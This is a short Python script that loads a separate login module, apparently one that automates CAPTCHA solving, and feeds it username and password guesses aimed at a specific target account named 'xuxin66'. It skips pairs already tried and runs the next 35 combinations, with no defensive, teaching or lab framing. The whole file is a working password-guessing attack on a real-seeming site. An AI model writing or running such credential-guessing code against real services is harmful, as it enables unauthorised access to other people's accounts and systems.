#!/usr/bin/env python3
import importlib.util
import sys

spec = importlib.util.spec_from_file_location("l", "/data/automation/bin/xuxin66_login_2captcha.py")
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)
users = [
    "xuxin66", "xuxin", "admin", "root", "faka", "pay", "shop", "zfb",
    "xx66", "datou", "qq", "test", "user", "demo", "xuxin079",
]
passes = [
    "datou111", "datou333", "xuxin66", "xuxin888", "xuxin123", "xuxin666",
    "123456", "888888", "666666", "admin", "admin123", "admin888", "faka123",
    "password", "qwe123", "abc123", "5201314", "xuxin66.top", "xuxin079",
    "ttwl66", "1q2w3e", "qwer1234",
]
tried = {
    ("datou111", "datou111"), ("datou111", "datou333"), ("datou333", "datou111"),
    ("datou333", "datou333"), ("xuxin66", "datou111"), ("xuxin66", "xuxin66"),
    ("xuxin66", "123456"), ("admin", "datou111"), ("admin", "admin"),
    ("admin", "123456"), ("xuxin", "datou111"), ("xuxin", "xuxin66"),
    ("test", "123456"), ("user", "123456"), ("faka", "123456"),
}
m.CREDS = [(u, p) for u in users for p in passes if (u, p) not in tried][:35]
print("creds", len(m.CREDS), flush=True)
sys.exit(m.main())
